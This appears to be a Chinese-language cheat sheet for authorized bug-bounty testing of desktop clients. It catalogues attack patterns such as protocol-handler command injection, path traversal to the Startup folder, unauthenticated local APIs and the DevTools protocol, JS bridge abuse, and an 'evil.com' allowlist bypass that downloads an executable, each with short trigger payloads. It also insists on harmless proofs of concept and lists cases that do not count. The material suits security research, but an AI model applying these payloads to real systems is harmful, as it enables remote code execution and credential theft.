# 客户端漏洞案例库

> 用途：找方向、对照验证；不是 payload 大全。验证只用无害 PoC（计算器、回环 curl 日志、读 hosts）。  
> 案例来自授权 SRC 经验；换目标时先按 `blackbox-surfaces.md` 重建攻击面，不要直接套。

## A. 功能型 / 设计型 / 内存型

| # | 模式 | 说明 |
|---|---|---|
| 1 | 功能漏洞 | 自定义协议、JS bridge、收发消息、文件解析、file 域 XSS 等能被远程利用的功能 |
| 2 | 设计缺陷 | 正常功能组合后产生远程危害（如预览自动请求、鉴权头跟随跳转） |
| 3 | 内存破坏 | 溢出、UAF、double free、OOB、整数溢出；需可远程到达并有 primitive |

## B. 自定义协议 / Deep Link

| # | 模式 | 触发/投递 | 影响 | 验证/判负要点 |
|---|---|---|---|---|
| 4 | 协议参数命令注入 | `myapp://?id=1\|calc` | RCE | 参数是否拼命令行；是否有外部投递 |
| 5 | 加载远程页 + 旧内核 | `myapp://?url=http://.../cve.html` | RCE | 客户端是否加载；内嵌 Chromium 版本；沙箱是否开 |
| 6 | 下载并执行 | `myapp://install?url=http://.../1.exe` | RCE | 是否自动下载执行；有无签名/确认 |
| 7 | 打开本地任意文件 | `myapp://?url=file://.../calc.exe` | RCE | `file://` 是否放行；是否交给 OS |
| 8 | 目录穿越到启动项 | `download?url=...&foldername=../../Startup` | RCE/持久化 | 路径规范化、目录边界、是否有权限 |
| 31 | file 域本地 HTML | 需本地 HTML 路径/用户名 | 本地文件读取 | 用户名可否猜测；有无 file 域限制 |

## C. 本地端口 / CDP

| # | 模式 | 触发 | 影响 | 验证/判负要点 |
|---|---|---|---|---|
| 9 | 端口执行接口 | `http://127.0.0.1:<port>/api/exec?cmd=calc` | RCE | 无鉴权/无 Origin；绑定地址 |
| 10 | 端口参数命令注入 | `/api/ping?ip=0.0.0.0\|calc` | RCE | 是否拼命令；回显/回调 |
| 11 | 端口加载远程页 | `/api/go-to?url=http://.../cve.html` | RCE | 同 #5 |
| 12 | 端口路径遍历 | `/../../../Windows/win.ini` | 任意文件读 | 先 `--path-as-is`；确认服务未规范化 |
| 13 | CDP 无 Origin 校验 | `http://127.0.0.1:<port>/json` | RCE | 默认回环；网页能否连；有无 Origin 校验 |
| 14 | 特权域绕过 + 下载执行 | `POST /download {"url":"http://www.test.com@evil.com/calc.exe"}` | RCE | 白名单是否前缀匹配；是否真下载执行 |
| 15 | 非回环端口/WS | 远程连 WebSocket/端口 | 远程 DoS | 绑定 `0.0.0.0`；无限调用/资源耗尽 |
| 21 | 端口参数溢出 | `/api/get?text=aaaa...` | DoS/RCE | 有无 GS/DEP/ASLR；有无可控 primitive |
| 30 | 白名单绕过 + 鉴权头泄露 | `www.xxx.com@evil.com` 预览 | 凭证泄露/RCE | 客户端是否把鉴权头带给构造 URL |

## D. JS Bridge / 内嵌浏览器

| # | 模式 | 触发 | 影响 | 验证/判负要点 |
|---|---|---|---|---|
| 16 | 内嵌页 Node 执行 | 页面里 `require('child_process').exec('calc')` | RCE | 页面是否进客户端；Node 是否开 |
| 17 | Bridge 命令执行 | `window.test.test({"cmd":"calc"})` | RCE | 方法可用域；参数是否过滤 |
| 18 | Bridge 打开本地文件 | `window.test.test({"openurl":"file://.../calc.exe"})` | RCE | 是否只允许特权域；能否绕过 |
| 19 | Bridge 任意文件读 | `window.test.test({"read":"file://.../win.ini"})` | 文件读取 | 路径校验；返回值是否可达 |
| 20 | Bridge 敏感信息 | `window.test.getCookie()` | 凭证泄露 | 方法可用域；返回值 |
| 22 | Bridge 参数溢出 | `window.test.test("\x00\x00\x00 ")` | DoS/RCE | 有无内存保护；primitive |
| 26 | file 域跨域 | 内嵌 Chrome 支持 file 跨域读/删 | 文件读写 | 是否真能跨域；用户名/路径 |
| 31 | file 域本地 HTML | 本地 HTML + 用户名猜测 | 文件读取 | 有用户名高危，无用户名中危 |

## E. 文件解析 / 社交功能

| # | 模式 | 触发 | 影响 | 验证/判负要点 |
|---|---|---|---|---|
| 23 | 接收文件解析 | 发 jpg/png/pdf/html/doc 等 | 溢出/XXE/DoS/XSS | 自动预览？哪个进程？解析器版本 |
| 24 | 聊天富文本 XSS | 图片/视频/富文本/评论/资料页 | 特权域/file 域 XSS、DoS | 接收端是否渲染；域限制 |
| 25 | 畸形媒体 | 畸形 PNG/HEVC/MP4 发到聊天 | 远程 DoS | 无需交互？解码器崩溃；是否有 primitive |
| 27 | 社交图片解析 | 图片解析溢出 | RCE/DoS | 自动缩略图/预览；解析库 |
| 28 | 发送可执行文件 | 发 exe/bat，对方点击 | RCE | 是否有确认/签名/白名单 |
| 29 | 视频通话解析 | 接收端堆溢出 | RCE | 协议/媒体解析；可控性 |

## F. 判负案例（不要报）

| 模式 | 为什么不算 |
|---|---|
| `myapp://page/webview?url=file://.../calc.exe` | URL 在更早的地方已被过滤/规范化，到不了 sink |
| 仅 Win+R/终端能触发协议 | 没有浏览器、聊天、文档、其他 App 的外部投递路径 |
| Bridge 只在特权域可用 | 没有特权域 XSS/绕过，普通页面调不到 |
| URL 预览实际走系统浏览器 | 不在客户端内嵌引擎边界内 |
| CDP 只绑回环且只有同用户可达 | 本地能力；没有跨权限边界 |
| 方法存在但参数已白名单/类型校验 | 只是 sink，没有可控输入 |
| 只崩不执行 | DoS/未证实；没有可控 primitive 不写 RCE |

## G. 无害 PoC 口径

- 命令执行：`calc.exe` / `notepad.exe`，不落地持久化。
- SSRF/端口：`curl http://127.0.0.1:<自己的端口>/hit` 看日志。
- 文件读取：读 `C:\Windows\System32\drivers\etc\hosts`，不读用户隐私。
- XSS：`document.title`/DOM marker，不弹窗骚扰。
- 内存类：只证明崩溃/越界 primitive，不写 shellcode、不投递恶意样本。
- 测完清理：临时文件、测试消息、下载物、启动项、调试附加。
